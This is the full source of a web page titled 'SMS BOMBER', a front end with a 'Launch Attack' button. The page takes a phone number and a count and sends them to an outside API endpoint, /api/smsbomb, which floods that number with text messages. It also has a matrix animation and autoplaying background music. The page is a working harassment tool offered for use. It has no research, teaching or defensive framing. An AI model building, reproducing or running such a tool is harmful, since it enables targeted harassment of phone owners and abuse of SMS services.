<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMS BOMBER</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: black;
      overflow: hidden;
      font-family: 'Segoe UI', monospace;
      color: white;
    }

    canvas {
      position: fixed;
      top: 0;
      left: 0;
      z-index: -1;
    }

    .container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
      z-index: 2;
      background: rgba(0, 0, 0, 0.65);
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 0 20px #00ffcc;
      max-width: 400px;
      width: 90%;
    }

    h1 {
      font-size: 2em;
      color: #00ffcc;
      text-shadow: 0 0 10px #00ffcc;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin: 15px 0 5px;
      font-weight: bold;
      text-align: left;
    }

    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border: none;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      font-size: 1em;
      outline: none;
    }

    input:focus {
      box-shadow: 0 0 10px #00ffcc;
    }

    button {
      margin-top: 15px;
      padding: 12px 20px;
      width: 100%;
      border-radius: 8px;
      background: #00ffcc;
      color: black;
      font-weight: bold;
      font-size: 1rem;
      border: none;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 0 10px #00ffcc;
    }

    button:hover {
      background: #00ccaa;
    }

    #response {
      margin-top: 20px;
      font-size: 1em;
      color: #00ff88;
      background: rgba(255, 255, 255, 0.05);
      padding: 10px;
      border-radius: 10px;
      white-space: pre-wrap;
      display: none;
    }

    #theme-toggle {
      position: absolute;
      top: 20px;
      right: 30px;
      z-index: 10;
      background: rgba(0, 0, 0, 0.5);
      color: #00ffcc;
      border: 1px solid #00ffcc;
      padding: 6px 12px;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
    }

    .footer {
      margin-top: 25px;
      font-size: 0.9em;
      color: #ccc;
    }

    .footer span {
      color: #00ffcc;
    }
  </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div id="theme-toggle" onclick="toggleTheme()">üåó Mode</div>

<div class="container">
  <h1>üö® SMS BOMBER</h1>

  <label for="phone">üì± Phone Number</label>
  <input type="text" id="phone" placeholder="e.g. 09503596043" />

  <label for="amount">üî¢ Count</label>
  <input type="number" id="amount" placeholder="e.g. 10" />

  <button onclick="sendSMS()">üî• Launch Attack</button>

  <div id="response"></div>

  <div class="footer">Made with üíö by <span>Vern</span></div>
</div>

<!-- Background Music -->
<audio id="bgMusic" autoplay loop muted>
  <source src="https://files.catbox.moe/n0aql3.mp3" type="audio/mpeg">
</audio>

<script>
  // Matrix effect
  const canvas = document.getElementById('matrix');
  const ctx = canvas.getContext('2d');
  canvas.height = window.innerHeight;
  canvas.width = window.innerWidth;

  const letters = "01VERNLOVE";
  const fontSize = 16;
  const columns = canvas.width / fontSize;
  const drops = Array.from({ length: columns }).fill(1);

  function drawMatrix() {
    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#00ffcc";
    ctx.font = fontSize + "px monospace";

    for (let i = 0; i < drops.length; i++) {
      const char = letters[Math.floor(Math.random() * letters.length)];
      ctx.fillText(char, i * fontSize, drops[i] * fontSize);

      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0;
      }
      drops[i]++;
    }
  }

  setInterval(drawMatrix, 40);
  window.onresize = () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  };

  // Music fade-in
  const music = document.getElementById("bgMusic");
  music.volume = 0;
  music.play().then(() => {
    setTimeout(() => {
      music.muted = false;
      let vol = 0;
      const fade = setInterval(() => {
        if (vol < 0.4) {
          vol += 0.05;
          music.volume = vol;
        } else {
          clearInterval(fade);
        }
      }, 200);
    }, 1000);
  }).catch(e => console.warn("Audio autoplay blocked"));

  // API Logic (Unchanged)
  function sendSMS() {
    const phone = document.getElementById("phone").value.trim();
    const amount = document.getElementById("amount").value.trim();
    const responseBox = document.getElementById("response");

    if (!phone || !amount) {
      responseBox.style.display = "block";
      responseBox.style.color = "orange";
      responseBox.textContent = "‚ö†Ô∏è Please enter both phone number and count.";
      return;
    }

    responseBox.style.display = "block";
    responseBox.style.color = "yellow";
    responseBox.textContent = "‚è≥ Sending request...";

    fetch(`https://jonell01-ccprojectsapihshs.hf.space/api/smsbomb?phonenum=${phone}&spamnum=${amount}`)
      .then(res => res.json())
      .then(data => {
        responseBox.style.color = data.success ? "#00ff88" : "#ff4a4a";
        responseBox.textContent = `‚úÖ Status: ${data.success ? "Success" : "Failed"}\nüì© Message: ${data.message || "Done."}`;
      })
      .catch(() => {
        responseBox.style.color = "#ff4a4a";
        responseBox.textContent = "‚ùå Error occurred. Please try again later.";
      });
  }

  // Optional Theme Toggle (dark/light glow)
  function toggleTheme() {
    document.body.classList.toggle("light-mode");
    document.getElementById("theme-toggle").innerText =
      document.body.classList.contains("light-mode") ? "üåô Mode" : "üåó Mode";
  }
</script>

</body>
</html>
